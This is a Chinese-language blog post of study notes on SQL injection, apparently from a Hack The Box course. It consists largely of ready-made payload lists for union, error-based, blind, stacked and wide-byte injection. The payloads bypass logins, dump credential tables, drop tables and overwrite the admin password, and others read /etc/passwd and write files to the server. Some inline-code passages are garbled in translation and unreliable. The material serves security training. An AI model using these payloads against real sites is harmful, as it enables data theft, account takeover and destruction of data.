---
title: SQL注入
published: 2026-06-16
updated: 2026-07-15
draft: false
description: HTB-SQL注入
image: ""
tags:
  - SQL注入
  - Hack-The-Box
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---
# SQL注入（SQLi）

Web 应用程序中可能存在多种注入漏洞，例如 HTTP 注入、代码注入和命令注入。然而，最常见的例子是 SQL 注入。当恶意用户试图传递能够更改 Web 应用程序发送到数据库的最终 SQL 查询的输入时，就会发生 SQL 注入，从而使用户能够直接对数据库执行其他非预期的 SQL 查询。

实现 SQL 注入的方法有很多。要使 SQL 注入生效，攻击者必须首先注入 SQL 代码，然后通过修改原始查询或执行全新的查询来篡改 Web 应用程序的逻辑。首先，攻击者必须将代码注入到预期用户输入范围之外，使其无法作为简单的用户输入执行。最基本的做法是注入单引号 (" `'`") 或双引号 (" `"`") 来转义用户输入范围，并将数据直接注入到 SQL 查询中。

攻击者一旦成功注入漏洞，就必须寻找执行不同 SQL 查询的方法。这可以通过编写 SQL 代码来实现，从而构建一个能够同时执行预期查询和新查询的查询。实现这一目标的方法有很多，例如使用[堆叠](https://www.sqlinjection.net/stacked-queries/)查询或[联合](https://www.mysqltutorial.org/sql-union-mysql.aspx/)查询。最后，为了获取新查询的输出，我们需要在 Web 应用程序前端对其进行解析或捕获。

## 用例和影响

SQL 注入可能会造成巨大的影响，尤其是在后端服务器和数据库的权限非常宽松的情况下。

首先，我们可能会获取一些本不应被我们看到的秘密/敏感信息，例如用户登录名、密码或信用卡信息，这些信息随后可能被用于其他恶意用途。SQL注入攻击会导致许多网站遭受密码和数据泄露，而这些泄露的信息随后会被重新用于窃取用户帐户、访问其他服务或执行其他恶意操作。

SQL注入的另一个应用场景是破坏Web应用程序的预期逻辑。最常见的例子是绕过登录验证，无需提供有效的用户名和密码。另一个例子是访问仅限特定用户使用的功能，例如管理员面板。攻击者还可以直接读写后端服务器上的文件，这反过来可能导致在后端服务器上植入后门，从而直接控制服务器，最终控制整个网站。

## 预防

SQL注入通常是由代码编写不佳的Web应用程序或后端服务器及数据库权限安全措施不足引起的。稍后，我们将讨论如何通过安全编码方法（例如用户输入清理和验证）以及适当的后端用户权限和控制来降低遭受SQL注入攻击的风险。

## 数据库管理系统

数据库管理系统（DBMS）用于创建、定义、托管和管理数据库。随着时间的推移，人们设计了各种类型的DBMS，例如基于文件的数据库、关系型数据库（RDBMS）、NoSQL数据库、基于图的数据库和键值存储数据库。

与数据库管理系统 (DBMS) 交互的方式有很多种，例如命令行工具、图形界面，甚至应用程序编程接口 (API)。DBMS 被广泛应用于银行、金融和教育等各个领域，用于记录大量数据。DBMS 的一些基本功能包括：

|**特征**|**描述**|
|---|---|
|`Concurrency`|实际应用中可能存在多个用户同时交互的情况。数据库管理系统（DBMS）确保这些并发交互能够成功完成，并且不会损坏或丢失任何数据。|
|`Consistency`|由于存在如此多的并发交互，数据库管理系统需要确保整个数据库中的数据保持一致性和有效性。|
|`Security`|数据库管理系统通过用户身份验证和权限控制提供细粒度的安全控制。这将防止未经授权的用户查看或编辑敏感数据。|
|`Reliability`|备份数据库很容易，而且在数据丢失或泄露的情况下，可以将数据库回滚到之前的状态。|
|`Structured Query Language`|SQL 通过直观的语法和对各种操作的支持，简化了用户与数据库的交互。|
### 数据库类型



数据库通常分为关系型数据库`Relational Databases`和`Non-Relational Databases`非关系型数据库。关系型数据库仅使用 SQL，而非关系型数据库则使用各种不同的通信方法。

#### 关系型数据库

关系数据库中的表都与键相关联，这些键可以提供数据库的快速概览，或者在需要查看特定数据时快速访问特定的行或列。这些表（也称为实体）彼此关联。例如，客户信息表可以为每位客户分配一个特定的 ID，该 ID 可以包含关于该客户的所有必要信息，例如地址、姓名和联系方式。同样，产品描述表可以为每个产品分配一个特定的 ID。存储所有订单的表只需要记录这些 ID 及其数量。这些表中的任何更改都会影响所有表，但影响是可预测且系统性的。

`relational database management system`然而，在处理集成数据库时，需要一种称为“关系”（或“关联” ）的概念，通过键将一个表链接到另一个表`RDBMS`。许多最初使用其他概念的公司正在转向关系数据库管理系统（RDBMS），因为这种概念易于学习、使用和理解。最初，这种概念仅被大型公司使用。然而，现在许多类型的数据库都实现了RDBMS概念，例如Microsoft Access、MySQL、SQL Server、Oracle、PostgreSQL等等。

例如，`users`关系数据库中可以有一个表，其中包含诸如`id``name`、`username`` `first_name`name`、` `last_name`name`、`name` 等列。`name``id`可以用作表键。另一个表 `posts`可能包含所有用户发布的帖子，其中包含诸如`posts`、` posts` 、`posts` 等`posts`列。`id``user_id``date``content`

#### 非关系型数据库

非关系型数据库（也称为`NoSQL`数据库）不使用表、行、列、主键、关系或模式。相反，NoSQL 数据库根据存储的数据类型，使用各种存储模型来存储数据。由于数据库缺乏预定义的结构，NoSQL 数据库具有很高的可扩展性和灵活性。因此，当处理定义不明确、结构不清晰的数据集时，NoSQL 数据库是存储此类数据的最佳选择。NoSQL 数据库有四种常见的存储模型：

- 键值
- 基于文档
- 宽列
- 图形

以上每种模型都有不同的数据存储方式。例如，该`Key-Value`模型通常以 JSON 或 XML 格式存储数据，每个键值对都有一个键，并将所有数据作为其值存储：

上述示例可以用 JSON 表示为：

```
{   "100001": {    "date": "01-01-2021",    "content": "Welcome to this web application."  },  "100002": {    "date": "02-01-2021",    "content": "This is the first post on this web app."  },  "100003": {    "date": "02-01-2021",    "content": "Reminder: Tomorrow is the ..."  } }
```

它看起来类似于像`Python`或`PHP`（即`{'key':'value'}`）这样的语言中的字典项，其中`key`通常是字符串，而`value`可以是字符串、字典或任何类对象。

NoSQL 数据库最常见的例子是`MongoDB`

非关系型数据库采用不同的注入方式，称为 NoSQL 注入。
### 利用方式

#### 一、联合注入 (Union Injection)

适用于页面有数据回显的场景。

**步骤：**
1. 判断闭合方式 → 2. 确定列数(`order by`) → 3. 确定回显位 → 4. 爆数据

```sql
-- 判断闭合（数字型 vs 字符型）
id=1 and 1=1       -- 数字型
id=1' and '1'='1   -- 单引号闭合
id=1" and "1"="1   -- 双引号闭合

-- 确定列数
1' order by 3--+   -- 递增测试, 报错说明超过列数

-- 确定回显位
-1' union select 1,2,3--+

-- 爆数据
-1' union select 1,database(),version()--+
-1' union select 1,table_name,3 from information_schema.tables where table_schema='dbname'--+
-1' union select 1,column_name,3 from information_schema.columns where table_name='users'--+
-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```

#### 二、报错注入 (Error-based Injection)

适用于无回显但报错信息可见的场景。

| 函数 | 数据库 | Payload示例 |
|------|--------|-------------|
| `updatexml` | MySQL | `and updatexml(1,concat(0x7e,(select database())),1)` |
| `extractvalue` | MySQL | `and extractvalue(1,concat(0x7e,(select user())))` |
| `floor+rand+group` | MySQL | `and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)` |
| `convert/cast` | SQL Server | `and 1=convert(int,@@version)` |
| `XMLType` | Oracle | `-` |
| `xmlserialize` | PostgreSQL | `and 1=(select xmlserialize(content version() as varchar(100)))` |

**updatexml 完整利用链：**
```sql
-- 当前库: and updatexml(1,concat(0x7e,database()),1)
-- 表名: and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='db' limit 0,1)),1)
-- 限制: 每次最多回显32字符, 需多次请求
```

#### 三、布尔盲注 (Boolean Blind)

适用于完全无回显、但页面状态有差异（正确/错误）的场景。

```sql
-- 逐字符猜解
and ascii(substr((select database()),1,1))>100
and ascii(substr((select database()),1,1))=100

-- 猜表名
and (select count(*) from information_schema.tables where table_schema='db' and table_name like 'a%')>0

-- 猜列名
and (select count(*) from information_schema.columns where table_name='users' and column_name like 'a%')>0

-- 猜数据
and ascii(substr((select group_concat(username) from users),1,1))>100
```

**常用截取函数：** `substr()` / `left()` / `right()` / `mid()` / `substring()`

#### 四、时间盲注 (Time Blind)

适用于页面状态无差异、无报错的场景，通过时间延迟判断条件真假。

| 数据库 | 延时函数 |
|--------|----------|
| MySQL | `sleep(5)` / `benchmark(10000000,md5(1))` |
| SQL Server | `waitfor delay '0:0:5'` |
| PostgreSQL | `pg_sleep(5)` |
| Oracle | `dbms_lock.sleep(5)` |

```sql
-- MySQL时间盲注
and if(ascii(substr((select database()),1,1))>100,sleep(5),0)
and case when ascii(mid(database() from 1 for 1))>100 then sleep(5) else 0 end

-- 用benchmark代替sleep（绕过sleep过滤）
and if(ascii(substr(database(),1,1))>100,benchmark(10000000,md5(1)),0)
```

#### 五、堆叠注入 (Stacked Query)

条件：数据库接口支持多语句（`mysqli_multi_query()`或类似）。

```sql
id=1;insert into users values('hack','pass')--+
id=1;update users set password='123' where username='admin'--+
id=1;drop table test--+
```

#### 六、搜索型注入

```sql
-- 原始SQL: select * from news where title like '%$keyword%'
-- 闭合需要处理 % 通配符
%' union select 1,2,3--+
%' union select 1,2,3 where '%'='%
```

#### 七、宽字节注入

条件：数据库使用GBK/GB2312字符集 + 后端addslashes转义。

```sql
-- addslashes转义: ' → \'  (0x5c27)
-- 在GBK下 %df + 0x5c = 運 (一个汉字), 后面 ' 逃逸
%df' or 1=1--+
%df' union select 1,2,3--+
```

#### 八、Base64编码注入

条件：应用对参数先base64解码再拼入SQL。

```plain
原始: 1' union select 1,2,3--+
编码: MScgdW5pb24gc2VsZWN0IDEsMiwzLS0r
```

#### 九、二次注入

第一次请求将恶意数据存入数据库（被转义/过滤的处理入库），第二次请求从数据库读取时不再转义直接拼入SQL触发。

---

### 防御方案

1. **参数化查询（预编译）**：`$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?")` 
2. **输入验证**：白名单限制输入类型/长度/格式
3. **最小权限**：数据库账户仅授予必要权限，禁用FILE/INTO OUTFILE
4. **关闭错误显示**：生产环境不输出数据库报错
5. **WAF**：部署应用层防火墙检测常见注入模式

### 真实案例

- 2019年某CMS union注入导致千万用户数据泄露
- sql-labs靶场全覆盖练习

### 相关工具

- sqlmap：自动化注入检测与利用 `sqlmap -u "url?id=1" --dbs`
- Burp Suite：手动注入分析
## SQL注入发现

在开始篡改 Web 应用程序逻辑并尝试绕过身份验证之前，我们首先需要测试登录表单是否存在 SQL 注入漏洞。为此，我们将在用户名后添加以下有效载荷之一，并观察是否会导致任何错误或页面行为发生变化：

|有效载荷|URL编码|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

注意：在某些情况下，我们可能需要使用经过 URL 编码的有效载荷版本。例如，当我们直接将有效载荷放在 URL 中（即 HTTP GET 请求）时就需要这样做。

那么，让我们先插入一个单引号：

![管理面板显示 SQL 查询执行：SELECT * FROM logins WHERE username='' AND password='something'; 并出现错误信息：您的 SQL 语法有误；请检查手册中第 1 行“something”附近的正确语法。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/quote_error.png)

我们看到抛出的是 SQL 错误，而不是预期的`Login Failed`消息。页面抛出错误的原因是生成的查询语句为：

```
SELECT * FROM logins WHERE username=''' AND password = 'something';
```


如前一节所述，我们输入的引号数量为奇数，导致语法错误。一种方法是注释掉查询语句的其余部分，并将剩余部分作为注入语句的一部分，从而形成一个有效的查询语句。另一种方法是在注入语句中使用偶数个引号，这样最终的查询语句仍然可以正常工作。

## OR注射

为了绕过身份验证，我们需要查询始终返回空值`true`，无论输入什么用户名和密码。为此，我们可以利用`OR`SQL 注入中的 `NULL` 运算符。

如前所述，MySQL 文档中关于[操作优先级的](https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html)说明指出，` `AND`if` 运算符会在 `if` 运算符之前执行。这意味着，如果整个查询中`OR`至少有一个条件和一个`if` 运算符，则整个查询的执行结果为 `true`，因为 `if`运算符在其操作数之一为 `true` 时会返回`false` 。`TRUE``OR``TRUE``OR``TRUE``TRUE`

一个始终会返回结果的条件示例`true`是`'1'='1'`。但是，为了保持 SQL 查询有效并保持引号数量为偶数，我们将删除最后一个引号并使用 ('1'='1')，而不是使用 ('1'='1')，这样原始查询中剩余的单个引号就会保留在它的位置上。

因此，如果我们注入以下条件，并`OR`在其与原始条件之间添加一个运算符，则它应该始终返回`true`：

```
admin' or '1'='1
```


最终查询语句应如下所示：

```
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

这意味着：

- 如果用户名是`admin`  
    `OR`
- 如果`1=1`返回`true`“总是返回`true`”  
    `AND`
- 如果密码是`something`

![SQL 查询逻辑图：SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something'。逻辑流程显示 OR 条件为真，因此即使密码条件为假，整个语句也为真。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/or_inject_diagram.png)

让我们来详细分析一下：

首先对运算符`AND`进行求值：

- `'1'='1'`是`True`。
- `password='something'`是`False`。
- 该条件的结果`AND`是`False`因为`True AND False`它是`False`。

接下来，对`OR`运算符进行求值：

- 如果`username='admin'`存在，则整个查询返回`True`。
- 在此背景下，该`'1'='1'`条件无关紧要，因为它不影响该`AND`条件的结果。

`True`因此，如果用户名存在，查询将返回结果`'admin'`，绕过身份验证。

注意：上面使用的有效载荷只是众多可用于绕过身份验证逻辑的有效载荷之一。您可以在[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)中找到 SQL 注入绕过身份验证有效载荷的完整列表，每个有效载荷都适用于特定类型的 SQL 查询。


### 使用 OR 运算符绕过身份验证

我们不妨试试用这个用户名，看看会有什么反应。![管理面板显示 SQL 查询执行情况：SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something'; 并显示消息：用户 admin 登录成功](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/inject_success.png)

我们已成功以管理员身份登录。但是，如果我们不知道有效的用户名怎么办？让我们这次尝试使用不同的用户名发出相同的请求。

![管理面板显示 SQL 查询执行情况：SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something'; 并显示消息：登录失败！](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/notadmin_fail.png)

登录失败，因为`notAdmin`表中不存在该对象，导致整个查询结果为假。

![SQL 查询逻辑图：SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something'。逻辑流程显示 OR 条件为 False，导致整个语句为 False。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/notadmin_diagram_1.png)

为了再次成功登录，我们需要一个全局`true`查询。这可以通过在密码字段中插入一个条件来实现`OR`，使其始终返回 true `true`。我们尝试`something' or '1'='1`使用 true 作为密码。

![管理面板显示 SQL 查询执行结果：SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something' OR '1'='1'; 并显示消息：用户 admin 登录成功](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/password_or_injection.png)

由于附加条件会返回表中的所有内容，并且第一行中的用户已登录，因此整个查询`OR`都会返回该结果。在这种情况下，由于两个条件都会返回结果，我们无需提供测试用户名和密码，可以直接开始注入并仅使用用户名和密码登录。`true``WHERE``true``'``' or '1' = '1`

![管理面板显示 SQL 查询执行情况：SELECT * FROM logins WHERE username='' OR '1'='1' AND password='something' OR '1'='1'; 并显示消息：用户 admin 登录成功](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/basic_auth_bypass.png)

这样做之所以有效，是因为查询结果与`true`用户名或密码无关。

# 数据库枚举

## MySQL 指纹识别

在枚举数据库之前，我们通常需要确定所处理的数据库管理系统（DBMS）类型。这是因为每种DBMS都有不同的查询方式，了解其类型有助于我们确定要使用的查询。

初步猜测是，如果我们在 HTTP 响应中看到的 Web 服务器是 `http://example.com``Apache`或 ` `Nginx`http://example.com`，那么可以合理推测该 Web 服务器运行在 Linux 系统上，因此数据库管理系统 (DBMS) 很可能是Linux `MySQL`。同样，如果 Web 服务器是 `http://example.com` `IIS`，那么也很有可能是 Microsoft DBMS，因此`MSSQL`数据库管理系统很可能是 Microsoft。然而，这只是一个不太可靠的猜测，因为许多其他数据库也可以运行在不同的操作系统或 Web 服务器上。因此，我们可以测试不同的查询来识别我们正在处理的数据库类型。

正如本模块所述`MySQL`，让我们来识别`MySQL`数据库。以下查询及其输出将告诉我们，我们正在处理的是`MySQL`：

|有效载荷|何时使用|预期输出|输出错误|
|---|---|---|---|
|`SELECT @@version`|当我们获得完整的查询输出时|MySQL 版本 'ie `10.3.22-MariaDB-1ubuntu1`'|在 MSSQL 中返回 MSSQL 版本。在其他数据库管理系统中会出错。|
|`SELECT POW(1,1)`|当我们只有数值输出时|`1`|其他数据库管理系统出现错误|
|`SELECT SLEEP(5)`|盲/无输出|页面响应延迟 5 秒后返回`0`。|不会因与其他数据库管理系统的交互而延迟响应。|

正如我们在上一节的例子中看到的，当我们尝试这样做时`@@version`，它给出了以下结果：

`http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,@@version,3,4-- -`

![搜索界面包含一个文本框和一个标有“搜索”的按钮。下方是一个表格，列包括：端口代码、端口城市和端口流量。条目包括 10.3.22-MariaDB-1ubuntu1、3 和 4。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/db_version_1.jpg)

输出结果`10.3.22-MariaDB-1ubuntu1`表明我们正在处理的`MariaDB`数据库管理系统类似于 MySQL。由于我们已经有了直接的查询结果，因此无需测试其他有效负载。相反，我们可以测试它们并查看结果。

## 信息架构数据库

要使用 MySQL 从表中提取数据`UNION SELECT`，我们需要正确编写`SELECT`查询语句。为此，我们需要以下信息：

- 数据库列表
- 每个数据库中的表列表
- 每个表中的列列表

根据以上信息，我们可以编写`SELECT`语句，从数据库管理系统（DBMS）中任何数据库的任何表中导出任何列的数据。这就是数据库的优势所在`INFORMATION_SCHEMA`。

[INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html)数据库包含服务器上所有数据库和表的元数据。该数据库在利用 SQL 注入漏洞时起着至关重要的作用。由于这是一个独立的数据库，我们不能直接使用 SQL`SELECT`语句调用其中的表。如果我们只在 SQL 语句中指定表名`SELECT`，它将在同一个数据库中查找表。

因此，要引用另一个数据库中的表，我们可以使用点号（' `.`'）运算符。例如，要引用名为 `database_name` 的数据库中的`SELECT`表，我们可以使用：`users``my_database`

```
SELECT * FROM my_database.users;
```


同样，我们也可以查看`INFORMATION_SCHEMA`数据库中存在的表。

### TABLE

在从数据库导出数据之前`dev`，我们需要获取要使用语句查询的表列表`SELECT`。要查找数据库中的所有表，我们可以使用`TABLES`数据库表名`INFORMATION_SCHEMA`。

TABLES表包含数据库中所有表的信息。该表包含多列，但我们只关注 `tableName`[和](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)`TABLE_SCHEMA`` `TABLE_NAME`tableId` 列。`tableName``TABLE_NAME`列存储表名，而 `ta `TABLE_SCHEMA`​​bleId` 列指向每个表所属的数据库。这可以类似于我们查找数据库名称的方法。例如，我们可以使用以下有效负载来查找`dev`数据库中的表：

```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

请注意，我们将数字“2”和“3”替换为“TABLE_NAME”和“TABLE_SCHEMA”，以便在同一个查询中获取两列的输出。

```
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```


注意：我们添加了一个 (where table_schema='dev') 条件，以便仅返回 'dev' 数据库中的表，否则我们将获得所有数据库中的所有表，而数据库的数量可能很多。

我们在开发数据库中看到了四个表，分别是`credentials`，，，和。例如，表可能包含敏感信息`framework`，需要仔细查看。`pages``posts``credentials`

### COLUMN

要导出表中的数据`credentials`，我们首先需要找到表中的列名，这些列名可以在`COLUMNS`数据库的 `INFORMATION_SCHEMA`表中找到。`COLUMNS`表包含了所有数据库中所有列的信息。这有助于我们找到要查询的列名。我们可以使用 `COLUMNS` 、`COLUMNS` 和`COLUMNS` 列来实现这一点。和之前一样，让我们​​尝试以下有效负载来查找表中的列名：[](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html)`COLUMN_NAME``TABLE_NAME``TABLE_SCHEMA``credentials`

 ```
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
 ```

```
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

该表有两列，分别名为`username`和`password`。我们可以利用这些信息从表中导出数据。

### 数据

现在我们已经掌握了所有信息，可以编写查询语句，从数据库表中`UNION`导出第 2 列`username`和`password`第 3 列的数据。我们可以将第 2 列和第 3 列替换为第 1 列和第 2 列：

```
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

我们能够获取`credentials`表中的所有条目，其中包含密码哈希值和 API 密钥等敏感信息。

# 读取文件

除了从数据库管理系统 (DBMS) 中的各种表和数据库中收集数据外，SQL 注入还可以用于执行许多其他操作，例如在服务器上读取和写入文件，甚至在后端服务器上获得远程代码执行权限。

## 特权

读取数据比写入数据要常见得多。在现代数据库管理系统中，写入数据严格限制于特权用户，因为写入数据可能导致系统漏洞，我们稍后会看到。例如，在某些数据库中`MySQL`，数据库用户必须拥有`FILE`将文件内容加载到表中，然后从该表中导出数据并读取文件的权限。因此，让我们首先收集有关用户在数据库中的权限信息，以确定是否要对后端服务器进行文件读取和/或写入操作。

#### 数据库用户

首先，我们需要确定自己在数据库中的用户身份。虽然读取数据并不一定需要数据库管理员 (DBA) 权限，但在现代数据库管理系统 (DBMS) 中，这种权限越来越重要，因为只有 DBA 才拥有此类权限。其他常见数据库也同样如此。如果我们拥有 DBA 权限，那么我们很可能也拥有文件读取权限。如果没有，则需要检查我们的权限，看看我们可以执行哪些操作。要查找当前数据库用户，我们可以使用以下任一查询：

```
SELECT USER() SELECT CURRENT_USER() SELECT user from mysql.user
```

我们的`UNION`注入载荷如下：

```
cn' UNION SELECT 1, user(), 3, 4-- -
```

或者：

```
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

这告诉我们当前用户是谁，在本例中是`root`：

```
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, user(), 3, 4-- -
```


![搜索界面包含一个文本框和一个标有“搜索”的按钮。下方是一个表格，列包括：端口代码、端口城市和端口流量。条目包括 root@localhost、3 和 4。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/db_user.jpg)

这非常有希望，因为 root 用户很可能是 DBA，这将赋予我们很多权限。

#### 用户权限

现在我们知道了目标用户，接下来就可以开始查看我们拥有该用户的哪些权限了。首先，我们可以使用以下查询来测试我们是否拥有超级管理员权限：

```
SELECT super_priv FROM mysql.user
```

我们可以再次使用以下有效负载配合上述查询：

```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

如果数据库管理系统中有很多用户，我们可以添加`WHERE user="root"`仅显示当前用户权限的功能`root`：

```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```


![搜索界面包含一个文本框和一个标有“搜索”的按钮。下方是一个表格，列包括：端口代码、端口城市和端口流量。条目包括 root@localhost、3 和 4。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/root_privs.jpg)

查询结果为`Y`，这意味着`YES`拥有超级用户权限。我们还可以使用以下查询直接从模式中导出我们拥有的其他权限：

```
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

接下来，我们可以添加`WHERE grantee="'root'@'localhost'"`仅显示当前用户`root`权限的功能。我们的有效载荷将是：

```
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

我们可以看到当前用户可能拥有的所有权限：


![搜索界面包含一个文本框，内容为“cn” UNION SELECT 1, grant”，以及一个标有“搜索”的按钮。下方是一个表格，列包括：端口代码、端口城市和端口流量。条目包括“root”@“localhost”，端口城市值如 SELECT、INSERT、UPDATE，端口流量为 4。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/root_privs_2.jpg)

我们看到该`FILE`用户拥有相应的权限，可以读取文件，甚至可能写入文件。因此，我们可以尝试读取文件。

## LOAD_FILE

既然我们已经拥有读取本地系统文件的权限，接下来就使用[LOAD_FILE()](https://mariadb.com/kb/en/load_file/)`LOAD_FILE()`函数来实现。LOAD_FILE ()函数可用于 MariaDB/MySQL 中读取文件数据。该函数仅接受一个参数，即文件名。以下查询示例展示了如何读取文件：`/etc/passwd`

```
SELECT LOAD_FILE('/etc/passwd');
```


> 注意：只有当运行 MySQL 的操作系统用户拥有足够的权限时，我们才能读取该文件。

就像我们之前使用`UNION`注入语句一样，我们可以使用上面的查询语句：

```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```


![搜索界面包含一个文本框和一个标有“搜索”的按钮。下方是一个表格，列包括：端口代码、端口城市和端口流量。条目包含用户信息，例如 root:x:0:0:root:/root:/bin/bash 和 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/load_file_sqli.png)


### 另一个例子

我们知道当前页面是`search.php`。默认的 Apache 网站根目录是`/var/www/html`。让我们尝试读取 处的源代码`/var/www/html/search.php`。

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```


![搜索界面包含一个文本框和一个标有“搜索”的按钮。下方是一个表格，列包括：港口代码、港口城市和港口吞吐量。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/load_file_search.png)

然而，页面最终会在浏览器中渲染 HTML 代码。点击即可查看 HTML 源代码`[Ctrl + U]`。

![这是一段用于查询数据库的 PHP 代码片段。它检查是否设置了 `port_code` 参数，如果设置了，则构建一个 SQL 查询语句，从 `ports` 表中选择与 `port_code` 匹配的记录，然后执行该查询并获取结果。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/load_file_source.png)

源代码显示了完整的 PHP 代码，可以对其进行进一步检查，以查找数据库连接凭据等敏感信息或发现更多漏洞。

## 写入文件


在现代数据库管理系统（DBMS）中，向后端服务器写入文件会受到更多限制，因为我们可以利用这一点在远程服务器上编写 Web Shell，从而执行代码并控制服务器。因此，现代 DBMS 默认禁用文件写入，并要求数据库管理员（DBA）拥有特定权限才能写入文件。在写入文件之前，我们必须首先检查自己是否拥有足够的权限，以及 DBMS 是否允许写入文件。

### 写入文件权限

要使用 MySQL 数据库向后端服务器写入文件，我们需要三样东西：

1. `FILE`具有权限的用户已启用
2. MySQL 全局`secure_file_priv`变量未启用
3. 对后端服务器上我们要写入的位置拥有写入权限

我们已经确认当前用户拥有`FILE`写入文件的权限。现在我们需要检查 MySQL 数据库是否也拥有该权限。这可以通过检查`secure_file_priv`全局变量来实现。

#### secure_file_priv

[`secure_file_priv`](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)变量用于确定文件的读写权限。如果值为空，则可以从整个文件系统读取文件。否则，如果设置了特定目录，则只能从该变量指定的文件夹读取文件。另一方面，如果设置为 `false`，`NULL`则表示无法从任何目录读取文件。MariaDB 默认将此变量设置为空，这意味着如果用户拥有相应的`FILE`权限，则可以读写任何文件。但是， MariaDB 默认`MySQL`使用`/var/lib/mysql-files``/usr/local/bin` 作为文件读写权限。这意味着在默认设置下，通过`MySQL`注入攻击读取文件是不可能的。更糟糕的是，某些现代配置默认设置为 `false` `NULL`，这意味着无法在系统中的任何位置读取文件。

然而，由于我们使用了`UNION`注入，因此必须使用`SELECT`语句来获取值。这应该不是问题，因为所有变量和大多数配置都存储在`INFORMATION_SCHEMA`数据库中。`MySQL`全局变量存储在名为[global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html)的表中，根据文档，该表有两`variable_name`列`variable_value`。

我们需要从`INFORMATION_SCHEMA`数据库的该表中选择这两列。MySQL 配置中有数百个全局变量，我们不想全部检索出来。然后，我们将`secure_file_priv`使用`WHERE`之前章节中学习的子句来筛选结果，只显示所需的变量。

最终的 SQL 查询语句如下：

```
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```


因此，与其他注入查询类似`UNION`，我们可以使用以下有效载荷获取上述查询结果。请记住添加另外两列`1`作为`4`垃圾数据，使总共有 4 列：

```
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```


![搜索界面包含一个文本框和一个标有“搜索”的按钮。下方是一个表格，列包括：端口代码、端口城市和端口流量。条目包含 SECURE_FILE_PRIV、3 和 4。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/secure_file_priv.jpg)

结果显示该`secure_file_priv`值为空，这意味着我们可以对任何位置的文件进行读写操作。

### SELECT INTO OUTFILE

既然我们已经确认用户需要将文件写入后端服务器，接下来让我们尝试使用SELECT INTO OUTFILE`SELECT .. INTO OUTFILE`语句来实现。SELECT [INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/)语句可以将 SELECT 查询结果写入文件。这通常用于从表中导出数据。

要使用此功能，我们可以`INTO OUTFILE '...'`在查询语句后添加参数，将结果导出到指定的文件中。以下示例将表格的输出保存`users`到`/tmp/credentials`文件中：
`

如果我们访问后端服务器并查看`cat`该文件，就可以看到该表的内容：

```
ziddzide@htb[/htb]$ cat /tmp/credentials  1       admin   392037dbba51f692776d6cefb6dd546d 2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

也可以直接将`SELECT`字符串写入文件，从而允许我们将任意文件写入后端服务器。

```
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```


> 提示：高级文件导出利用“FROM_BASE64("base64_data")”函数，以便能够写入长/高级文件，包括二进制数据。

### 通过 SQL 注入写入文件

